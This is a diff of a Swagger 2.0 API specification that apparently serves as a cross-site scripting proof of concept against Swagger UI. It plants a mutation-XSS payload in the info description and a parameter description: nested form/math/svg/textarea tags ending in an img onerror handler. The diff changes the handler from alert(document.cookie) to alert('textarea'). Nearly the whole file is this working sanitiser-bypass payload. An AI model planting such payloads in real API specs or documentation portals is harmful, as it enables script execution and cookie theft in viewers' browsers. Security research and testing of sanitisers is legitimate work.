@@ -1,8 +1,8 @@
 swagger: '2.0'
 info:
-  title: XSS Attack BY adrianalvird
+  title: Swagger XSS by adrianalvird
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -15,20 +15,20 @@ consumes:
 security:
   - basicAuth: []
 paths:
-  /adrianalvird:
+  /accounts:
     get:
       responses:
         '200':
           description: No response was specified
       tags:
-        - adrianalvird_XSS_D
+        - accounts
       operationId: findAccounts
       summary: Finds all accounts
   '/accounts/groupid/{id}':
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
 
           format: int64
           in: path
